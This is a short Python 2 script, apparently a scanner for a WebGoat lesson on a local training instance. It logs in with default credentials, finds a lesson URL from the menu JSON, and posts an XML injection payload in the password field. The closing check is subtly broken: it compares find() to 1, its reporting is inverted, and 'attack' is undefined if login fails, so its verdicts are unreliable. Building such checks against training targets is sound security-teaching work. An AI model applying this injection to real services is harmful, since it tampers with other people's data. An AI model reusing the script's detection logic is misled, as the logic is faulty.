import requests
import sys
import json
import re

#url inits
base_url = "http://127.0.0.1:8080/WebGoat/"
login_url = base_url + 'login.mvc'
post_url = base_url + 'j_spring_security_check'
menu_url = base_url + 'service/lessonmenu.mvc'

#success string
success = 'Congratulations. You have successfully completed this lesson'

#session data
login_data = {'username': 'webgoat','password': 'webgoat'}
attack_string = {'password': 'hacked<id xsi:type=\'xsd:int\'>102</id>'}

######################################################################

#Step 1: Login
request = requests.Session()
request.get(login_url)
login = request.post(post_url, data=login_data)


if login.status_code != 200 :
	print "Bad request"

else :
#Step 2 : Menu retrieval and parsing
	menu = request.get(menu_url)
	menu_json = menu.json()
	menu_link =  menu_json[18]['children'][2]['link']

#Step 3: Attack Vulnerability Page
	attack_url = base_url + menu_link
	attack_page = request.get(attack_url)
	attack = request.post(attack_url, data=attack_string)

#Step 4: Check for Success
if attack.text.find(success) == 1 :
	print 'No Vulnerability'
else :
	print 'Vuln-34 Present'
